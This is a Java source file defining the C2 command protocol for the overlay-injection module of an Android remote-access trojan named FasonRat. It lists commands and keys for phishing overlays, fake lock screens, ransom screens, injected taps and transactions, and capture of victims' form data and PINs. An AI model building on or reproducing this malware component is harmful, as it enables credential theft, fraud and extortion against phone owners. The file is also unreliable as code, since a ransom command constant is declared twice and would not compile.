package com.fason.app.features.springe;

/**
 * Springe — Overlay Injection Engine Protocol Constants.
 * Add these constants to Protocol.java or keep as a dedicated file.
 * All command strings follow the FasonRat convention: "feature:action"
 */
public final class SpringeProtocol {

    private SpringeProtocol() {}

    /* ──────────────────────────────────────
     * COMMANDS (actions sent from C2)
     * ────────────────────────────────────── */

    // --- Lifecycle ---
    public static final String CMD_ARM          = "springe:arm";
    public static final String CMD_DISARM       = "springe:disarm";
    public static final String CMD_PAUSE        = "springe:pause";
    public static final String CMD_RESUME       = "springe:resume";

    // --- Target management ---
    public static final String CMD_SET_TARGETS  = "springe:setTargets";
    public static final String CMD_ADD_TARGET   = "springe:addTarget";
    public static final String CMD_REMOVE_TARGET= "springe:removeTarget";
    public static final String CMD_LIST_TARGETS = "springe:listTargets";

    // --- Trigger configuration ---
    public static final String CMD_SET_TRIGGERS  = "springe:setTriggers";
    public static final String CMD_SET_TRIGGER   = "springe:setTrigger";
    public static final String CMD_REMOVE_TRIGGER= "springe:removeTrigger";

    // --- Overlay show/hide ---
    public static final String CMD_SHOW          = "springe:show";
    public static final String CMD_HIDE          = "springe:hide";
    public static final String CMD_SHOW_INVISIBLE= "springe:showInvisible";
    public static final String CMD_SHOW_BLACK    = "springe:showBlack";
    public static final String CMD_SHOW_LOCK     = "springe:showLockScreen";
    public static final String CMD_SHOW_DIALOG   = "springe:showDialog";
    public static final String CMD_SHOW_RANSOM   = "springe:showRansom";

    // --- Templates ---
    public static final String CMD_LIST_TEMPLATES   = "springe:listTemplates";
    public static final String CMD_FETCH_TEMPLATE   = "springe:fetchTemplate";
    public static final String CMD_DELETE_TEMPLATE  = "springe:deleteTemplate";
    public static final String CMD_UPDATE_TEMPLATES = "springe:updateTemplates";

    // --- Injection ---
    public static final String CMD_INJECT_INPUT     = "springe:injectInput";
    public static final String CMD_INJECT_GESTURE   = "springe:injectGesture";
    public static final String CMD_INJECT_INTENT    = "springe:injectIntent";
    public static final String CMD_INJECT_TRANSACTION = "springe:injectTransaction";

    // --- Data ---
    public static final String CMD_FLUSH           = "springe:flushData";
    public static final String CMD_GET_STATUS      = "springe:getStatus";
    public static final String CMD_CLEAR_CAPTURES  = "springe:clearCaptures";

    /* ──────────────────────────────────────
     * OVERLAY TYPES
     * ────────────────────────────────────── */
    public static final String OVERLAY_WEBVIEW       = "webview";
    public static final String OVERLAY_INVISIBLE     = "invisible";
    public static final String OVERLAY_BLACK         = "black";
    public static final String OVERLAY_LOCKSCREEN    = "lockscreen";
    public static final String OVERLAY_DIALOG        = "dialog";
    public static final String OVERLAY_RANSOM        = "ransom";
    public static final String OVERLAY_NOTIFICATION  = "notification";

    /* ──────────────────────────────────────
     * TRIGGER TYPES
     * ────────────────────────────────────── */
    public static final String TRIGGER_APP_LAUNCH    = "app_launch";
    public static final String TRIGGER_NOTIFICATION  = "notification";
    public static final String TRIGGER_URL           = "url";
    public static final String TRIGGER_SCHEDULE      = "schedule";
    public static final String TRIGGER_GEO           = "geo";
    public static final String TRIGGER_C2_PUSH       = "c2_push";

    /* ──────────────────────────────────────
     * INJECTION TYPES
     * ────────────────────────────────────── */
    public static final String INJECT_TYPE_TEXT      = "text";
    public static final String INJECT_TYPE_CLICK     = "click";
    public static final String INJECT_TYPE_SWIPE     = "swipe";
    public static final String INJECT_TYPE_INTENT    = "intent";

    /* ──────────────────────────────────────
     * JSON KEYS
     * ────────────────────────────────────── */
    public static final String KEY_TARGET_PACKAGE    = "targetPackage";
    public static final String KEY_TARGET_NAME       = "targetName";
    public static final String KEY_TARGET_CATEGORY   = "targetCategory";
    public static final String KEY_TARGET_PRIORITY   = "priority";
    public static final String KEY_TARGET_PACKAGES   = "targetPackages";
    public static final String KEY_OVERLAY_TYPE      = "overlayType";
    public static final String KEY_TRIGGER_TYPE      = "triggerType";
    public static final String KEY_TEMPLATE_ID       = "templateId";
    public static final String KEY_TEMPLATE_NAME     = "templateName";
    public static final String KEY_TEMPLATE_URL      = "templateUrl";
    public static final String KEY_TEMPLATE_HTML     = "templateHtml";
    public static final String KEY_TEMPLATE_HASH     = "templateHash";
    public static final String KEY_TEMPLATE_VERSION  = "templateVersion";
    public static final String KEY_TEMPLATES         = "templates";
    public static final String KEY_ARMED             = "armed";
    public static final String KEY_ACTIVE            = "active";
    public static final String KEY_CAPTURED_DATA     = "capturedData";
    public static final String KEY_CAPTURE_COUNT     = "captureCount";
    public static final String KEY_INJECTION_TYPE    = "injectionType";
    public static final String KEY_INJECTION_DATA    = "injectionData";
    public static final String KEY_INJECTION_TARGET  = "injectionTarget";
    public static final String KEY_OVERLAY_STATE     = "overlayState";
    public static final String KEY_CURRENT_APP       = "currentApp";
    public static final String KEY_CURRENT_ACTIVITY  = "currentActivity";
    public static final String KEY_OVERLAY_WINDOW    = "overlayWindow";
    public static final String KEY_FIELD_NAME        = "fieldName";
    public static final String KEY_FIELD_VALUE       = "fieldValue";
    public static final String KEY_FORM_DATA         = "formData";
    public static final String KEY_SOURCE_APP        = "sourceApp";
    public static final String KEY_TIMESTAMP_MS      = "timestampMs";
    public static final String KEY_SESSION_ID        = "sessionId";
    public static final String KEY_BUFFER_SIZE       = "bufferSize";
    public static final String KEY_SCREEN_WIDTH      = "screenWidth";
    public static final String KEY_SCREEN_HEIGHT     = "screenHeight";
    public static final String KEY_DENSITY           = "density";
    // New overlay type
public static final String OVERLAY_MAX = "max"; // FullScreen (ransomware)

// New commands for Phase 2
public static final String CMD_SHOW_RANSOM     = "springe:showRansom";
public static final String CMD_SEND_NOTIFICATION = "springe:sendNotification";
public static final String CMD_SET_SCHEDULES   = "springe:setSchedules";
public static final String CMD_GET_SCHEDULES   = "springe:getSchedules";

// Additional keys
public static final String KEY_DIALOG_TYPE     = "dialogType";
public static final String KEY_RANSOM_TYPE     = "ransomType";
public static final String KEY_GESTURE_TYPE    = "gestureType";
public static final String KEY_SCHEDULES       = "schedules";
public static final String KEY_COOLDOWN_MS     = "cooldownMs";
public static final String KEY_EXPIRES_AT      = "expiresAt";
public static final String KEY_NOTIF_TITLE     = "notificationTitle";
public static final String KEY_NOTIF_TEXT      = "notificationText";
public static final String KEY_NOTIF_ICON      = "notificationIcon";

// Mode constants for LockScreenOverlay
public static final String KEY_LOCK_MODE       = "mode";
public static final int LOCK_MODE_PIN = 0;
public static final int LOCK_MODE_PATTERN = 1;
public static final int LOCK_MODE_PASSWORD = 2;
}
